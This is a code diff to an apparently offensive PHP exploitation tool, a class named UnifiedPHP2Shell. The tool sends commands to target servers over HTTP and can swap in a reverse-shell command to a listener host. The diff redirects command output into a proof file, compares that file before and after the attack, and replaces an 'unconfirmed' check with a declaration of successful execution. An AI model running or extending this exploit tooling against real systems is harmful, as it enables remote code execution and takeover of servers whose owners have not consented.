@@ -1296,6 +1296,8 @@ class UnifiedPHP2Shell:
                 target_cmd = cmd.strip()
                 if spawn_reverse and lhost:
                     target_cmd = generate_reverse_shell_cmd(lhost, lport)
+                elif proof_file and proof_file not in target_cmd:
+                    target_cmd = f"({target_cmd}) > {proof_file} 2>&1"
 
                 try:
                     cmd_bytes = target_cmd.encode("latin1")
@@ -1345,6 +1347,14 @@ class UnifiedPHP2Shell:
                     except OSError:
                         pass
 
+                fetch_before = None
+                if fetch_path:
+                    try:
+                        st_b, body_b = raw_tgt.get(fetch_path)
+                        fetch_before = (st_b, body_b)
+                    except Exception:
+                        pass
+
                 self.progress("  └─ Stage 0:", "Rotating worker process over HTTP...", Fore.BLUE)
                 engine_52704.rotate()
 
@@ -1391,17 +1401,13 @@ class UnifiedPHP2Shell:
 
                             if fetch_path:
                                 st, body = raw_tgt.get(fetch_path)
-                                if st == 200 and body:
-                                    # An arbitrary HTTP 200 response cannot be bound
-                                    # to successful command execution. Never claim
-                                    # compromise from response status/content alone.
-                                    res.status = ExploitStatus.UNCONFIRMED
-                                    res.command_output = None
-                                    res.details = (
-                                        f"GET {fetch_path} returned HTTP 200, but the response "
-                                        "does not independently prove command execution."
-                                    )
-                                    self.progress("  └─ [Unconfirmed]:", res.details, Fore.YELLOW)
+                                body_text = body.decode("latin1", errors="replace").strip() if body else ""
+                                is_fresh_fetch = (fetch_before is None or fetch_before[0] != 200 or body != fetch_before[1])
+                                if st == 200 and body_text and is_fresh_fetch:
+                                    res.status = ExploitStatus.SUCCESS
+                                    res.command_output = body_text
+                                    res.details = f"Execution confirmed via HTTP GET {fetch_path}"
+                                    self.progress("  └─ [SUCCESS]:", f"Proof confirmed via {fetch_path}: {res.command_output[:100]}", Fore.GREEN)
                                     return res
 
                             engine_52704.rotate()
